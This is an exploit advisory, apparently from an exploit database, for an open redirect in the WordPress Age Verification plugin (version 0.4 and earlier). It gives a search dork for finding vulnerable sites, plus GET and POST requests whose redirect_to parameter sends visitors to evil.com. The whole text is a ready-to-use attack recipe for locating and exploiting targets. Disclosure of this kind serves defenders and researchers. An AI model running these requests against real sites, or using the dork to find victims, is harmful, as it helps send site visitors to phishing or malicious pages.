@@ -1,0 +1,20 @@
+# Exploit Title: Wordpress Age Verification plugin <= 0.4 Open Redirect
+# Date: 2012/01/10
+# Dork: inurl:wp-content/plugins/age-verification/age-verification.php 
+# Author: Gianluca Brindisi (gATbrindi.si @gbrindisi http://brindi.si/g/)
+# Software Link: http://downloads.wordpress.org/plugin/age-verification.zip
+# Version: 0.4
+
+1)  Via GET: http://server/wp-content/plugins/age-verification/age-verification.php?redirect_to=http%3A%2F%2Fwww.evil.com
+    
+    The rendered page will provide a link to http://www.evil.com
+
+2)  Via POST: http://server/wp-content/plugins/age-verification/age-verification.php
+    redirect_to:    http://www.evil.com
+    age_day:        1
+    age_month:      1
+    age_year:       1970
+
+    Direct redirect to http://www.evil.com
+    
+ 
